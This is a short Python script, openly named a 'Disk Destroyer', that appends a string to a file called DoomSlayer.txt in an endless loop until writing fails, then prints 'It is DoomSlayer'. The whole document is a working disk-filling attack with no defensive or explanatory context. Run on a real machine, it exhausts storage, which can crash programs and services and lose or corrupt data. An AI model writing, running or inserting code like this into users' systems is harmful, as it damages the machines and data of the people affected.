str = "This is a Disk Destroyer file "
with open("DoomSlayer.txt", "a") as file:
 while True:
  try:
    file.write(str)
  except Exception:
    break
 file.close()

print("It is DoomSlayer")
